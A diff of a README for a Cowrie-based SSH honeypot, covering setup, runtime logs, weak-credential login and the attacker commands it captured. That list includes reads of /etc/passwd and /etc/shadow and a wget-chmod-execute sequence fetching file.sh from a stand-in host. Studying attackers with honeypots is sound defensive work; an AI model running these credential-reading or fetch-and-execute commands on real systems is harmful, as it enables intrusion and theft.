@@ -1,36 +1,67 @@
-# 🛡️ SSH Honeypot using Cowrie
+🛡️ AI Honeypot (Cowrie-Based SSH Honeypot)
 
-## 📌 Overview
+A realistic SSH honeypot built using Cowrie, designed to simulate vulnerable systems, capture attacker behavior, and analyze intrusion patterns safely.
 
-This project implements a fully functional SSH honeypot using Cowrie to simulate a vulnerable Linux server and capture attacker behavior in a controlled environment.
+📌 Overview
 
-The system emulates a fake shell, logs malicious activities, and provides insights into real-world attack patterns such as brute-force login attempts, reconnaissance, and malware execution.
+This project sets up a low-interaction SSH honeypot that mimics a Linux system and logs all attacker activity including:
 
----
+Login attempts
+Commands executed
+File download attempts
+Session behavior
 
-## ⚙️ Features
+The system is isolated and prevents real damage while providing deep insights into attacker tactics.
 
-* Fake SSH server running on port `2222`
-* Emulated Linux environment (fake filesystem + shell)
-* Real-time logging of attacker activity
-* Command tracking (whoami, ls, cat, wget, etc.)
-* Simulated malware execution attempts
-* Safe environment (no real system compromise)
+⚙️ Tech Stack
+Cowrie Honeypot
+Python 3.13
+Twisted Framework
+Linux Environment
+Virtual Environment (venv)
+🚀 Setup Instructions
+1. Clone Repository
+git clone <your-repo-url>
+cd ai_honeypot
+2. Create Virtual Environment
+python3 -m venv cowrie-env
+source cowrie-env/bin/activate
+3. Install Dependencies
+pip install -r requirements.txt
+4. Run Cowrie
+bin/cowrie start
+🔥 Runtime Behavior
 
----
+When started, the honeypot initializes successfully:
 
-## 🧠 Attack Simulation & Observations
+CowrieSSHFactory starting on 2222
+Ready to accept SSH connections
+Port: 2222
+Emulated System: linux-x64-lsb
+Output Engine: jsonlog
+🔐 Authentication System
 
-### 🔐 Login Behavior
+Since no custom credential file is configured:
 
-* Default credential-based access allowed (`root:rooot`)
-* Simulates weak authentication vulnerability
+Could not read etc/userdb.txt, default database activated
+Example Login Attempts
 
-### 💻 Commands Observed
+✅ Successful:
 
-```
+login attempt [root/rooot] succeeded
+
+❌ Failed:
+
+login attempt [root/root] failed
+
+👉 The system intentionally allows weak credentials to simulate vulnerable systems.
+
+🧠 Captured Attacker Behavior
+
+Typical commands observed during sessions:
+
 ls
-cd
+cd /tmp
 pwd
 whoami
 cat /etc/passwd
@@ -38,120 +69,91 @@ cat /etc/shadow
 wget http://test.com/file.sh
 chmod +x file.sh
 ./file.sh
-```
+🌐 Network Simulation
+DNS resolution is simulated:
+resolve_cname(test.com)
+External access is blocked:
+Attempt to access blocked network address
 
-### 🔍 Behavioral Analysis
+👉 This ensures:
 
-* **Reconnaissance** → `ls`, `pwd`
-* **Privilege Check** → `whoami`
-* **Credential Harvesting** → `/etc/passwd`, `/etc/shadow`
-* **Payload Delivery** → `wget`
-* **Execution Attempt** → `chmod +x`, `./file.sh`
-
-### 🚫 Security Controls
-
-* Outbound network requests blocked
-* Fake file system prevents real data exposure
-* Malware execution is simulated, not real
-
----
-
-## 🏗️ Architecture
-
-```
-Attacker
-   ↓
-SSH Connection (Port 2222)
-   ↓
-Cowrie Honeypot
-   ↓
-Fake Shell Environment
-   ↓
-Logging Engine (cowrie.log / JSON logs)
-```
-
----
-
-## 📂 Project Structure
-
-```
-├── cowrie/
-├── cowrie-env/
-├── var/log/cowrie/
-│   └── cowrie.log
-├── etc/
-│   └── cowrie.cfg
-```
-
----
-
-## 🚀 Setup & Usage
-
-### 1. Clone Repository
-
-```
-git clone <your-repo-link>
-cd <repo-name>
-```
-
-### 2. Create Virtual Environment
-
-```
-python3 -m venv cowrie-env
-source cowrie-env/bin/activate
-```
-
-### 3. Start Honeypot
-
-```
-./bin/cowrie start
-```
-
-### 4. Connect to Honeypot
-
-```
-ssh root@localhost -p 2222
-```
-
----
-
-## 📊 Logs & Monitoring
-
-Logs are stored in:
-
-```
+Malware behavior is logged
+No real external execution occurs
+📂 Logs & Data Storage
+Main Logs
 var/log/cowrie/cowrie.log
-```
+Session Recordings (TTY Logs)
+var/lib/cowrie/tty/
 
-These logs capture:
+Example:
 
-* Connection attempts
-* Login credentials used
-* Commands executed
-* Session duration
+Closing TTY Log: var/lib/cowrie/tty/<session_hash>
+🔄 Session Lifecycle
 
----
+Each attacker session follows:
 
-## 🔧 Future Improvements
+Connection initiated
+SSH handshake (OpenSSH client detected)
+Authentication attempt
+Fake shell spawned
+Commands executed
+Session terminated
 
-* Custom credential database (`userdb.txt`)
-* Real-time dashboard for log visualization
-* Automated attack pattern detection
-* Deployment on public VPS for real-world data collection
+Example:
 
----
+Connection lost after 21.2 seconds
+🧪 Testing Status
 
-## 🎯 Key Learnings
+Current observations:
 
-* Understanding attacker mindset and workflow
-* SSH protocol behavior and authentication flow
-* Honeypot design and security monitoring
-* Log analysis for cybersecurity insights
+All connections from:
+127.0.0.1
 
----
+👉 Meaning:
 
-## ⚠️ Disclaimer
+System is in local testing phase
+Not yet exposed to real-world attackers
+⚠️ Known Limitations
+No custom credential database (userdb.txt)
+No real internet interaction
+Only SSH (port 2222) enabled
+No monitoring/dashboard integration
+🚀 Future Improvements
+1. Custom Credentials
 
-This project is for educational and research purposes only. Do not expose the system to the public internet without proper security controls.
+Create:
 
----
+etc/userdb.txt
+2. Internet Exposure
+Deploy on VPS
+Enable port forwarding
+Optionally switch to port 22
+3. Monitoring & Visualization
+ELK Stack (Elasticsearch, Logstash, Kibana)
+Custom Python log analyzer
+4. Threat Intelligence
+
+Track:
+
+IP addresses
+Command patterns
+Malware behavior
+5. Enhance Realism
+Add fake filesystem data
+Simulate deeper Linux environment
+Improve command responses
+🧠 Key Insight
+
+This honeypot is:
+
+✅ Fully functional
+✅ Capturing attacker behavior
+✅ Safe from real compromise
+⚠️ Currently in testing phase
+🎯 Goal
+
+To evolve this system into a real-world attacker trap capable of:
+
+Logging real intrusion attempts
+Studying attacker psychology
+Building cybersecurity intelligence
